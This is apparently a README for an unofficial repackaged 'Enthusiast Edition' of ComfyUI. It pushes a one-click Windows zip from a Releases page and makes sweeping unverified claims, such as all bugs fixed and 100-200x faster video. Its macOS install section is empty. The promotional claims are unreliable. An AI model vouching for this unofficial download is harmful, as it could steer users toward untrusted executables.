# ComfyUI: Enthusiast Edition

### ⚡ Lightweight Installer • 1-Click Setup • No Coding Required

**Forget complex installations. This is a lightweight, one-click solution. No code, no hassle—just download, click, and everything works immediately.**

---

### 🚀 Build Highlights

**This is an unofficial version created by enthusiasts. All known bugs have been fixed.**

**Exclusive Features & Support:**

* **Turbodiffusion:** Support for **100-200x fast** video generations.
* **Qwen-Image-Edit-2511**
* **Z Image Turbo**
* **WAN 2.6**
* **Native INTEL GPU Support**

---

## Overview

**The most powerful and modular visual AI engine and application.**

ComfyUI lets you design and execute advanced stable diffusion pipelines using a graph/nodes/flowchart based interface.

### Key Features

* **Interface:** Graph/node/flowchart based interface.
* **Hardware:** Supports NVIDIA, AMD, **Intel**, Apple Silicon, Ascend.
* **Model Support:** SD1.x, SD2.x, SDXL, SD3, Flux, Stable Video Diffusion, Stable Audio, Hunyuan3D, and more.
* **Performance:** Asynchronous Queue system, smart memory management (works on GPUs with low VRAM), CPU mode support.
* **Offline:** Works fully offline.
* **Save/Load:** Save workflows as JSON. Full workflows embeddable in generated PNG/WebP/FLAC files.

## Features
- Nodes/graph/flowchart interface to experiment and create complex Stable Diffusion workflows without needing to code anything.
- Image Models
   - SD1.x, SD2.x 
   - [SDXL]
   - [Stable Cascade]
   - [SD3 and SD3.5]
   - Pixart Alpha and Sigma
   - [AuraFlow]
   - [HunyuanDiT]
   - [Flux]
   - [Lumina Image 2.0]
   - [HiDream]
   - [Qwen Image]
   - [Hunyuan Image 2.1]
   - [Flux 2]
   - [Z Image]
- Image Editing Models
   - [Omnigen 2]
   - [Flux Kontext]
   - [HiDream E1.1]
   - [Qwen Image Edit]
- Video Models
   - [Stable Video Diffusion]
   - [Mochi]
   - [LTX-Video](
   - [Hunyuan Video]
   - [Wan 2.1]
   - [Wan 2.2]
   - [Hunyuan Video 1.5]
- Audio Models
   - [Stable Audio]
   - [ACE Step]
- 3D Models
   - [Hunyuan3D 2.0]
- Asynchronous Queue system
- Many optimizations: Only re-executes the parts of the workflow that changes between executions.
- Smart memory management: can automatically run large models on GPUs with as low as 1GB vram with smart offloading.
- Can load ckpt and safetensors: All in one checkpoints or standalone diffusion models, VAEs and CLIP models.
- Safe loading of ckpt, pt, pth, etc.. files.
- Embeddings/Textual inversion
- [Loras (regular, locon and loha)]
- [Hypernetworks]
- Loading full workflows (with seeds) from generated PNG, WebP and FLAC files.
- Saving/Loading workflows as Json files.
- Nodes interface can be used to create complex workflows like one for [Hires fix] or much more advanced ones.
- [Area Composition]
- [Inpainting] with both regular and inpainting models.
- [ControlNet and T2I-Adapter]
- [Upscale Models (ESRGAN, ESRGAN variants, SwinIR, Swin2SR, etc...)]
- [GLIGEN]
- [Model Merging]
- [LCM models and Loras]
- Latent previews with [TAESD]

## Installation

### 🟢 1-Click Install (Windows Portable)

**The easiest way to get started.**

1. Go to the **Releases** page.
2. Download the **Windows Portable** zip file.
3. Extract the file.
4. **Run.** (No extra setup required).

### Manual Install (macOS)

## Shortcuts

| Keybind | Explanation |
| --- | --- |
| `Ctrl` + `Enter` | Queue up current graph for generation |
| `Ctrl` + `Z` / `Ctrl` + `Y` | Undo / Redo |
| `Ctrl` + `S` / `Ctrl` + `O` | Save / Load workflow |
| `Ctrl` + `M` | Mute/unmute selected nodes |
| `Ctrl` + `B` | Bypass selected nodes |
| `Space` | Move the canvas around when held |
| `Double-Click LMB` | Open node quick search palette |

